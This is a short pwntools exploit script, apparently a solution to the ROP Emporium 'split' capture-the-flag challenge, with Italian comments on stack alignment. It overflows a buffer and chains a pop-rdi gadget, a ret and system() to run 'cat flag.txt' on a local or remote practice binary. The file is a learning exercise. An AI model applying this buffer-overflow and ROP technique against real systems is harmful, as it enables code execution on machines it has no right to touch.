#!/usr/bin/env python3

from pwn import *

exe = ELF("./split")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    pause()
    #usefulFunction 
    #r.sendafter(b"> ", b"A"*32 + b"B"*8 + p64(0x400746))
    #movaps xmmword ptr [rsp], xmm1 richiede lo stack allineato, bisogna aggiungere una ret, così da allineare lo stack dopo
    #dopo la stringa 
    #p64(0x40053e) questa è l'indirizzamento alla ret 
    # pop rdi; ret   "cat flag.txt" ret system();
    r.sendafter(b"> ", b"A"*32 + b"B"*8 + p64(0x4007c3) + p64(0x601060) + p64(0x40053e) + p64(0x400560))

    r.interactive()


if __name__ == "__main__":
    main()
